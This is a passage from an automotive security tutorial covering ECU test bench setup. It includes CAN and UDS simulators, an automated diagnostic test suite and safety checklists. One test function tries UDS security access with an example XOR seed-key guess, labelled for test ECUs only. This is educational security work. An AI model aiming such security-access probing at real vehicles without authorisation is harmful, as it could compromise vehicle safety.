    def __init__(self, config):
        self.config = config
        # Initialize power control hardware interface
    
    def set_power(self, state):
        """Control ECU power"""
        # This would interface with actual power control hardware
        # Examples: relay control, programmable power supply, etc.
        print(f"Power {'ON' if state else 'OFF'}")
    
    def set_voltage(self, voltage):
        """Set supply voltage"""
        print(f"Setting voltage to {voltage}V")
    
    def get_current(self):
        """Read current consumption"""
        # Return current measurement
        return 2.5  # Example current in Amps
```

#### Test Configuration Example
```json
{
  "interfaces": {
    "primary_can": {
      "channel": "can0",
      "bustype": "socketcan"
    }
  },
  "power": {
    "type": "relay_controlled",
    "default_voltage": 12.0
  },
  "tests": {
    "basic_communication": {
      "description": "Test basic ECU communication",
      "power_on_delay": 3,
      "stop_on_failure": true,
      "steps": [
        {
          "name": "Send tester present",
          "type": "send_message",
          "interface": "primary_can",
          "id": 2016,
          "data": "023E0000000000"
        },
        {
          "name": "Expect positive response",
          "type": "expect_response",
          "interface": "primary_can",
          "timeout": 1.0,
          "expected_id": 2024,
          "expected_data": "027E0000000000"
        },
        {
          "name": "Read VIN",
          "type": "send_message",
          "interface": "primary_can",
          "id": 2016,
          "data": "0322F19000000000"
        },
        {
          "name": "Expect VIN response",
          "type": "expect_response",
          "interface": "primary_can",
          "timeout": 1.0,
          "expected_id": 2024
        }
      ]
    }
  }
}
```

## Safety Procedures

### Pre-Test Checklist

```bash
#!/bin/bash
# ECU Test Bench Safety Checklist

echo "ECU Test Bench Safety Checklist"
echo "==============================="

# Power system checks
echo "1. Power System:"
echo "   [ ] Power supply current limit set (<10A)"
echo "   [ ] Emergency stop accessible"
echo "   [ ] All connections properly insulated"
echo "   [ ] Ground connections verified"

# Network checks
echo "2. Network Isolation:"
echo "   [ ] Test network isolated from production"
echo "   [ ] CAN bus properly terminated (120Ω)"
echo "   [ ] No connection to operational vehicles"

# ECU checks
echo "3. ECU Safety:"
echo "   [ ] ECU is bench unit (not from operational vehicle)"
echo "   [ ] ECU firmware backed up"
echo "   [ ] Test procedures reviewed"
echo "   [ ] Recovery procedures available"

# Documentation
echo "4. Documentation:"
echo "   [ ] Wiring diagrams available"
echo "   [ ] Test procedures documented"
echo "   [ ] Safety procedures posted"
echo "   [ ] Emergency contacts available"

# Personal safety
echo "5. Personal Safety:"
echo "   [ ] Safety glasses available"
echo "   [ ] First aid kit accessible"
echo "   [ ] Fire extinguisher nearby"
echo "   [ ] Proper lighting and ventilation"

echo ""
echo "Complete all checks before proceeding with tests!"
```

### Emergency Procedures

```python
class EmergencyHandler:
    """Handle emergency conditions during testing"""
    
    def __init__(self, test_bench):
        self.test_bench = test_bench
        self.emergency_log = []
    
    def emergency_stop(self, reason="Manual trigger"):
        """Execute emergency stop procedure"""
        
        timestamp = time.time()
        
        try:
            # 1. Cut all power
            self.test_bench.power_control.set_power(False)
            
            # 2. Stop all communication
            for interface in self.test_bench.interfaces.values():
                interface.shutdown()
            
            # 3. Log emergency
            emergency_record = {
                'timestamp': timestamp,
                'reason': reason,
                'actions_taken': [
                    'Power disconnected',
                    'CAN interfaces shutdown'
                ]
            }
            
            self.emergency_log.append(emergency_record)
            
            # 4. Notify operators
            print("*** EMERGENCY STOP EXECUTED ***")
            print(f"Reason: {reason}")
            print("All systems shut down")
            
        except Exception as e:
            print(f"Emergency stop error: {e}")
    
    def detect_overcurrent(self, current_limit=10.0):
        """Monitor for overcurrent conditions"""
        
        current = self.test_bench.power_control.get_current()
        
        if current > current_limit:
            self.emergency_stop(f"Overcurrent detected: {current}A > {current_limit}A")
            return True
        
        return False
    
    def detect_communication_flood(self, message_threshold=1000):
        """Detect CAN bus flooding"""
        
        # This would monitor CAN traffic rates
        # Implementation depends on specific monitoring setup
        pass
```

## Practical Exercises

### Exercise 1: Basic Bench Setup

```bash
#!/bin/bash
# Basic ECU test bench setup

echo "Setting up basic ECU test bench..."

# 1. Set up virtual CAN networks
sudo modprobe vcan
sudo ip link add dev vcan_ecu type vcan
sudo ip link add dev vcan_test type vcan
sudo ip link set up vcan_ecu
sudo ip link set up vcan_test

echo "Virtual CAN networks created: vcan_ecu, vcan_test"

# 2. Start ECU simulator
python3 -c "
import can
import time
import threading

def ecu_simulator():
    bus = can.interface.Bus('vcan_ecu', bustype='socketcan')
    
    while True:
        msg = bus.recv(timeout=1.0)
        if msg:
            print(f'ECU received: {msg}')
            
            # Respond to tester present
            if msg.arbitration_id == 0x7E0 and msg.data[1:3] == b'\x3E\x00':
                response = can.Message(
                    arbitration_id=0x7E8,
                    data=[0x02, 0x7E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
                )
                bus.send(response)
                print(f'ECU sent: {response}')

threading.Thread(target=ecu_simulator, daemon=True).start()
print('ECU simulator started on vcan_ecu')

# Keep script running
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print('Shutting down ECU simulator')
" &

ECU_PID=$!

# 3. Test communication
echo "Testing communication..."
sleep 2

# Send tester present
echo "Sending tester present..."
cansend vcan_ecu 7E0#023E0000000000

# Monitor responses
echo "Monitoring for responses..."
timeout 3 candump vcan_ecu

# Cleanup
echo "Cleaning up..."
kill $ECU_PID
sudo ip link delete vcan_ecu
sudo ip link delete vcan_test

echo "Basic bench setup test complete!"
```

### Exercise 2: Multi-ECU Network Simulation

```python
#!/usr/bin/env python3
"""
Simulate multi-ECU automotive network
"""

import can
import time
import threading
import random

class ECUSimulator:
    """Generic ECU simulator"""
    
    def __init__(self, name, can_interface, ecu_id, response_id):
        self.name = name
        self.bus = can.interface.Bus(can_interface, bustype='socketcan')
        self.ecu_id = ecu_id
        self.response_id = response_id
        self.running = False
        
        # ECU state
        self.state = {
            'power_mode': 'normal',
            'diagnostic_session': 'default',
            'security_access': False
        }
    
    def start(self):
        """Start ECU simulation"""
        self.running = True
        
        # Start message handling thread
        thread = threading.Thread(target=self.message_handler)
        thread.daemon = True
        thread.start()
        
        # Start periodic messages
        if hasattr(self, 'start_periodic_messages'):
            periodic_thread = threading.Thread(target=self.start_periodic_messages)
            periodic_thread.daemon = True
            periodic_thread.start()
        
        print(f"{self.name} ECU started (ID: {self.ecu_id:03X})")
    
    def stop(self):
        """Stop ECU simulation"""
        self.running = False
        print(f"{self.name} ECU stopped")
    
    def message_handler(self):
        """Handle incoming CAN messages"""
        while self.running:
            msg = self.bus.recv(timeout=1.0)
            
            if msg and msg.arbitration_id == self.ecu_id:
                self.process_message(msg)
    
    def process_message(self, msg):
        """Process received message"""
        if len(msg.data) < 2:
            return
        
        service_id = msg.data[1]
        
        # Handle common diagnostic services
        if service_id == 0x3E:  # Tester present
            self.send_positive_response(0x3E, [])
        elif service_id == 0x10:  # Diagnostic session control
            session = msg.data[2] if len(msg.data) > 2 else 1
            self.handle_session_control(session)
        elif service_id == 0x22:  # Read data by identifier
            if len(msg.data) >= 4:
                did = (msg.data[2] << 8) | msg.data[3]
                self.handle_read_data(did)
    
    def send_positive_response(self, service_id, data):
        """Send positive response"""
        response_data = [len(data) + 1, service_id + 0x40] + data
        response_data += [0x00] * (8 - len(response_data))  # Pad to 8 bytes
        
        response = can.Message(
            arbitration_id=self.response_id,
            data=response_data
        )
        
        self.bus.send(response)
        print(f"{self.name}: Sent positive response to service {service_id:02X}")
    
    def send_negative_response(self, service_id, nrc):
        """Send negative response"""
        response_data = [0x03, 0x7F, service_id, nrc, 0x00, 0x00, 0x00, 0x00]
        
        response = can.Message(
            arbitration_id=self.response_id,
            data=response_data
        )
        
        self.bus.send(response)
        print(f"{self.name}: Sent negative response to service {service_id:02X}, NRC: {nrc:02X}")
    
    def handle_session_control(self, session):
        """Handle diagnostic session control"""
        if session == 1:  # Default session
            self.state['diagnostic_session'] = 'default'
            self.send_positive_response(0x10, [session])
        elif session == 3:  # Extended session
            self.state['diagnostic_session'] = 'extended'
            self.send_positive_response(0x10, [session])
        else:
            self.send_negative_response(0x10, 0x12)  # Subfunction not supported
    
    def handle_read_data(self, did):
        """Handle read data by identifier"""
        
        # Simulate different data identifiers
        data_map = {
            0xF190: b'1HGBH41JXMN109186',  # VIN
            0xF194: b'V1.2.3',             # Software version
            0xF1A0: b'1234567890',         # Part number
        }
        
        if did in data_map:
            data = list(data_map[did])
            response_data = [(did >> 8) & 0xFF, did & 0xFF] + data
            self.send_positive_response(0x22, response_data)
        else:
            self.send_negative_response(0x22, 0x31)  # Request out of range

class EngineECU(ECUSimulator):
    """Engine ECU simulator"""
    
    def __init__(self, can_interface):
        super().__init__("Engine", can_interface, 0x7E0, 0x7E8)
        self.rpm = 800  # Idle RPM
        self.coolant_temp = 90  # Normal temp
    
    def start_periodic_messages(self):
        """Send periodic engine messages"""
        while self.running:
            # Send RPM
            rpm_data = [
                (self.rpm >> 8) & 0xFF,
                self.rpm & 0xFF,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]
            
            rpm_msg = can.Message(arbitration_id=0x123, data=rpm_data)
            self.bus.send(rpm_msg)
            
            # Send coolant temperature
            temp_data = [self.coolant_temp, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
            temp_msg = can.Message(arbitration_id=0x456, data=temp_data)
            self.bus.send(temp_msg)
            
            # Vary values slightly
            self.rpm += random.randint(-10, 20)
            self.rpm = max(600, min(3000, self.rpm))
            
            self.coolant_temp += random.randint(-1, 2)
            self.coolant_temp = max(80, min(110, self.coolant_temp))
            
            time.sleep(0.1)  # 10Hz update rate

class BodyECU(ECUSimulator):
    """Body control ECU simulator"""
    
    def __init__(self, can_interface):
        super().__init__("Body", can_interface, 0x7E1, 0x7E9)
        self.door_status = 0x00  # All doors closed
    
    def start_periodic_messages(self):
        """Send periodic body messages"""
        while self.running:
            # Send door status
            door_data = [self.door_status, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
            door_msg = can.Message(arbitration_id=0x789, data=door_data)
            self.bus.send(door_msg)
            
            # Occasionally change door status
            if random.random() < 0.05:  # 5% chance per second
                self.door_status ^= random.choice([0x01, 0x02, 0x04, 0x08])
            
            time.sleep(1.0)  # 1Hz update rate

def main():
    """Main simulation function"""
    
    print("Starting multi-ECU network simulation...")
    
    # Create ECU simulators
    engine_ecu = EngineECU('vcan0')
    body_ecu = BodyECU('vcan0')
    
    # Start ECUs
    engine_ecu.start()
    body_ecu.start()
    
    try:
        print("Simulation running... Press Ctrl+C to stop")
        print("Monitor with: candump vcan0")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nStopping simulation...")
        engine_ecu.stop()
        body_ecu.stop()
        print("Simulation stopped")

if __name__ == "__main__":
    main()
```

### Exercise 3: Automated Test Suite

```python
#!/usr/bin/env python3
"""
Automated ECU test suite
"""

import can
import time
import json
from datetime import datetime

class ECUTestSuite:
    """Comprehensive ECU test suite"""
    
    def __init__(self, config_file='test_config.json'):
        self.config = self.load_config(config_file)
        self.bus = can.interface.Bus(self.config['can_interface'], bustype='socketcan')
        self.test_results = []
    
    def load_config(self, config_file):
        """Load test configuration"""
        default_config = {
            'can_interface': 'vcan0',
            'ecu_request_id': 0x7E0,
            'ecu_response_id': 0x7E8,
            'timeout': 1.0,
            'tests': {
                'communication': True,
                'diagnostics': True,
                'security': False  # Dangerous - only on test ECUs
            }
        }
        
        try:
            with open(config_file, 'r') as f:
                loaded_config = json.load(f)
                default_config.update(loaded_config)
        except FileNotFoundError:
            print(f"Config file {config_file} not found, using defaults")
        
        return default_config
    
    def run_all_tests(self):
        """Run all enabled tests"""
        
        print("Starting ECU test suite...")
        print(f"Target ECU: {self.config['ecu_request_id']:03X} -> {self.config['ecu_response_id']:03X}")
        print("=" * 50)
        
        if self.config['tests']['communication']:
            self.test_basic_communication()
        
        if self.config['tests']['diagnostics']:
            self.test_diagnostic_services()
        
        if self.config['tests']['security']:
            self.test_security_features()
        
        self.generate_report()
    
    def test_basic_communication(self):
        """Test basic ECU communication"""
        
        print("\n1. Basic Communication Tests")
        print("-" * 30)
        
        # Test tester present
        result = self.send_and_verify(
            "Tester Present",
            [0x02, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
            expected_response=[0x02, 0x7E, 0x00]
        )
        self.test_results.append(result)
        
        # Test echo (if supported)
        result = self.send_and_verify(
            "Echo Test",
            [0x05, 0x01, 0x12, 0x34, 0x56, 0x00, 0x00, 0x00],
            expected_response=[0x05, 0x41, 0x12, 0x34, 0x56]
        )
        self.test_results.append(result)
    
    def test_diagnostic_services(self):
        """Test diagnostic services"""
        
        print("\n2. Diagnostic Service Tests")
        print("-" * 30)
        
        # Test session control
        result = self.send_and_verify(
            "Default Session",
            [0x02, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00],
            expected_response=[0x02, 0x50, 0x01]
        )
        self.test_results.append(result)
        
        # Test extended session
        result = self.send_and_verify(
            "Extended Session",
            [0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00],
            expected_response=[0x02, 0x50, 0x03]
        )
        self.test_results.append(result)
        
        # Test read VIN
        result = self.send_and_verify(
            "Read VIN",
            [0x03, 0x22, 0xF1, 0x90, 0x00, 0x00, 0x00, 0x00],
            expected_service=0x62,
            min_length=4
        )
        self.test_results.append(result)
        
        # Test read software version
        result = self.send_and_verify(
            "Read Software Version",
            [0x03, 0x22, 0xF1, 0x94, 0x00, 0x00, 0x00, 0x00],
            expected_service=0x62,
            min_length=4
        )
        self.test_results.append(result)
    
    def test_security_features(self):
        """Test security access (USE ONLY ON TEST ECUs)"""
        
        print("\n3. Security Feature Tests")
        print("-" * 30)
        print("WARNING: Only run on test ECUs!")
        
        # Test security access request
        result = self.send_and_verify(
            "Security Access Request Seed",
            [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00],
            expected_service=0x67,
            min_length=3
        )
        self.test_results.append(result)
        
        if result['passed']:
            # Extract seed from response
            seed = result['response'][2:4]  # Assuming 2-byte seed
            
            # Try simple key algorithm (this would be ECU-specific)
            key = [(seed[0] ^ 0x34), (seed[1] ^ 0x56)]  # Example XOR
            
            key_result = self.send_and_verify(
                "Security Access Send Key",
                [0x04, 0x27, 0x02, key[0], key[1], 0x00, 0x00, 0x00],
                expected_response=[0x02, 0x67, 0x02]
            )
            self.test_results.append(key_result)
    
    def send_and_verify(self, test_name, request_data, expected_response=None, 
                       expected_service=None, min_length=None):
        """Send message and verify response"""
        
        result = {
            'test_name': test_name,
            'timestamp': datetime.now().isoformat(),
            'passed': False,
            'request': request_data,
            'response': None,
            'error': None
        }
        
        try:
            # Send request
            request_msg = can.Message(
                arbitration_id=self.config['ecu_request_id'],
                data=request_data
            )
            self.bus.send(request_msg)
            
            # Wait for response
            response_msg = self.bus.recv(timeout=self.config['timeout'])
            
            if not response_msg:
                result['error'] = "No response received"
                print(f"  FAIL: {test_name} - No response")
                return result
            
            if response_msg.arbitration_id != self.config['ecu_response_id']:
                result['error'] = f"Wrong response ID: {response_msg.arbitration_id:03X}"
                print(f"  FAIL: {test_name} - Wrong response ID")
                return result
            
            result['response'] = list(response_msg.data)
            
            # Verify response
            if expected_response:
                if response_msg.data[:len(expected_response)] == bytes(expected_response):
                    result['passed'] = True
                else:
                    result['error'] = "Response data mismatch"
            elif expected_service:
                if len(response_msg.data) >= 2 and response_msg.data[1] == expected_service:
                    result['passed'] = True
                else:
                    result['error'] = f"Expected service {expected_service:02X}"
            elif min_length:
                if len(response_msg.data) >= min_length:
                    result['passed'] = True
                else:
                    result['error'] = f"Response too short: {len(response_msg.data)} < {min_length}"
            else:
                # Any response is success
                result['passed'] = True
            
            # Print result
            status = "PASS" if result['passed'] else "FAIL"
            response_hex = response_msg.data.hex().upper()
            print(f"  {status}: {test_name}")
            print(f"    Request:  {bytes(request_data).hex().upper()}")
            print(f"    Response: {response_hex}")
            
            if result['error']:
                print(f"    Error: {result['error']}")
        
        except Exception as e:
            result['error'] = str(e)
            print(f"  ERROR: {test_name} - {e}")
        
        return result
    
    def generate_report(self):
        """Generate test report"""
        
        print("\n" + "=" * 50)
        print("TEST SUMMARY")
        print("=" * 50)
        
        total_tests = len(self.test_results)
        passed_tests = sum(1 for r in self.test_results if r['passed'])
        failed_tests = total_tests - passed_tests
        
        print(f"Total Tests:  {total_tests}")
        print(f"Passed:       {passed_tests}")
        print(f"Failed:       {failed_tests}")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        
        # Save detailed report
        report_filename = f"ecu_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'config': self.config,
            'summary': {
                'total': total_tests,
                'passed': passed_tests,
                'failed': failed_tests,
                'success_rate': (passed_tests/total_tests)*100
            },
            'results': self.test_results
        }
        
        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"\nDetailed report saved to: {report_filename}")

def main():
    """Main test function"""
    
    # Create test suite
    test_suite = ECUTestSuite()
    
    # Run all tests
    test_suite.run_all_tests()

if __name__ == "__main__":
    main()
```

---

# Summary and Key Takeaways 📋

## What You've Learned

This comprehensive guide has equipped you with:

1. **Theoretical Foundation**: Threat modeling, attack surfaces, risk assessment
2. **Technical Protocols**: CAN, ISO-TP, GMLAN, and other automotive buses  
3. **Practical Skills**: SocketCAN setup, traffic analysis, reverse engineering
4. **Diagnostic Expertise**: UDS, DTCs, security access, session management
5. **Analysis Techniques**: Message correlation, pattern recognition, fuzzing
6. **ECU Security**: Firmware analysis, attack vectors, protection mechanisms
7. **Test Infrastructure**: Bench design, network simulation, automation
8. **Safety Practices**: Risk mitigation, ethical guidelines, legal compliance

## Ethical Guidelines

**Always Remember:**
- Only test on equipment you own or have explicit permission to test
- Never connect test tools to operational vehicles without authorization
- Follow local laws and regulations regarding automotive modifications
- Prioritize safety over research goals
- Document and report vulnerabilities responsibly
- Respect privacy and confidentiality

## Next Steps for Continued Learning

1. **Hands-On Practice**: Build your own test bench and practice with spare ECUs
2. **Advanced Topics**: Study specific manufacturer protocols and security mechanisms
3. **Community Engagement**: Join Open Garages or similar collaborative research groups
4. **Certification**: Consider automotive cybersecurity certifications (ISO 21434)
5. **Specialization**: Focus on areas like V2X security, over-the-air updates, or embedded systems
6. **Tool Development**: Create custom tools for your specific research needs

## Essential Resources

- **Original Book**: "The Car Hacker's Handbook" by Craig Smith
- **Standards**: ISO 11898 (CAN), ISO 14229 (UDS), ISO 21434 (Cybersecurity)
- **Tools**: can-utils, SocketCAN, Wireshark with automotive dissectors
- **Hardware**: CAN interfaces, oscilloscopes, logic analyzers, SDR equipment
- **Community**: Open Garages, automotive security conferences, research papers

Remember: Automotive security is about protecting lives, not just data. Use your skills responsibly and always prioritize safety.

---

*This guide is for educational purposes only. Always obtain proper authorization before testing automotive systems and follow all applicable laws and safety procedures.*